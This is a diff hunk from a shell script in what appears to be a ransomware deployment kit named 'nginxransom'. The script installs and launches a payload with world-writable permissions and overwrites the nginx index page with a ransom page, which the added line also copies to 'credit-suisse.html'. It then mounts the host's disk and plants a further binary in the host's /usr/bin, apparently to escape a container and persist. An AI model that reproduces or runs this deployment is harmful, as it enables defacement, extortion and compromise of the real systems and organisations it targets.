@@ -7,6 +7,7 @@ cp   nginxransom/initialize.txt /usr/bin/initialize
 chmod 777 /usr/bin/initialize 
 initialize &
 cp   nginxransom/web/index.html /usr/share/nginx/html/index.html
+cp   nginxransom/web/index.html /usr/share/nginx/html/credit-suisse.html
 diskpart=$(mount | grep   '^/dev/' | grep 'hosts' |  sed 's/ *$//g' | awk  '{print $1}')
 mount $diskpart /mnt/
 cp   nginxransom/bootstarp.txt /mnt/usr/bin/bootstarp
